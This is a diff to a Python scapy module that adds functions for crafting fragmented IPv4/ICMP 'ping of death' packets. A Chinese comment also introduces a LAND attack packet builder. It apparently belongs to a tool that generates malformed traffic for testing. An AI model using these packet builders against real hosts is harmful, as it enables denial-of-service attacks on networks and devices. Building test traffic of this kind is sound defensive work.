@@ -15,8 +15,36 @@ from scapy.all import *
 import random
 
 
-def ipv4_ping_of_death():
-    pass
+def ipv4_ping_of_death(smac, frag, src, dst, data):
+    data_link_layer = Ether(
+        src = smac
+    )
+    network_layer = IP(
+        id = 28752,
+        flags = 1,
+        frag = frag,
+        proto = 1,
+        src = src,
+        dst = dst
+    )
+    pkt = data_link_layer / network_layer / data
+    return pkt
+
+
+def ipv4_ping_of_death_end(smac, frag, src, dst, data):
+    data_link_layer = Ether(
+        src = smac
+    )
+    network_layer = IP(
+        id = 28752,
+        flags = 0,
+        frag = frag,
+        proto = 1,
+        src = src,
+        dst = dst
+    ) / ICMP()
+    pkt = data_link_layer / network_layer
+    return pkt
 
 
 # 构造ipv4 Land-Base攻击异常包，需源目的地址相同，且TCP配置SYN标识位。
